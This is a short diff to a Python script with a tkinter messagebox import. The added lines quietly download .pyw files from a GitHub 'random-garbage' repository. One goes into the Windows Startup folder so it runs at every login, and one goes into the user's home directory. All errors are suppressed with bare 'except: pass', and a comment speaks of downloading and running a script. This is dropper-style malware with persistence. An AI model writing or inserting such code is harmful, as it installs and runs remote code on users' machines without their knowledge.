@@ -7,10 +7,27 @@ from tkinter import messagebox
 #%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 
 # Download new ric
+"""
 ricpath = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"
 
 try:
     urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric_download.pyw", ricpath)
+except Exception:
+    pass
+"""
+
+ricpath = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pastedl.pyw"
+
+try:
+    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/pastedl.pyw", ricpath)
+except Exception:
+    pass
+
+# Download and runc script from pastebin
+ricpath = os.path.expanduser("~") + "\\ric.pyw"
+
+try:
+    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric.pyw", ricpath)
 except Exception:
     pass
 
